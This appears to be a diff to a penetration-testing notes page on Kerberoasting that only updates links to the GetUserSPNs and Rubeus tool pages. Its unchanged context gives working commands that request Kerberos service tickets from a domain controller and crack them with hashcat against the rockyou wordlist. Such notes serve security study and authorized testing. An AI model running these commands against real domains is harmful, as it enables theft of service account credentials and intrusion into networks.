@@ -12,14 +12,14 @@ SPN format:
 HTTP/web04.corp.com:80
 ```
 
-Perform remotely with [GetUserSPNs](../../14%20Impacket%20Tools/GetUserSPNs.md)
+Perform remotely with [GetUserSPNs](../../1%20Tools/Extra%20Impacket/GetUserSPNs.md)
 
 ```bash
 impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER
 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
-Perform locally with [Rubeus](../0%20Tools/Local/Rubeus.md)
+Perform locally with [Rubeus](../../1%20Tools/Local/Rubeus.md)
 
 ```
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
